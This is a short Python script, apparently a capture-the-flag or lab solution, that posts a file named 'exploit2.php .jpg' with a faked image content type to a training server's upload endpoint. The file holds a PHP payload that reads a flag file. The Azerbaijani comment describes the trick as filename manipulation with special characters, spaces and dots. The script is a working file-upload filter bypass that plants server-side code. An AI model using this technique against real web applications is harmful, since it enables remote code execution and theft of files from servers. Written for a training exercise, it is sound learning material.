import requests

url = "http://test-s3.web0x05.hbtn/api/task2/"

# Fayl adında xüsusi simvol və boşluq/nöqtə manipulyasiyası
files = {
    'file': ('exploit2.php .jpg', '<?php readfile("FLAG_2.txt") ?>', 'image/jpeg')
}

response = requests.post(url, files=files)
print("Status Code:", response.status_code)
print("Response:", response.text)
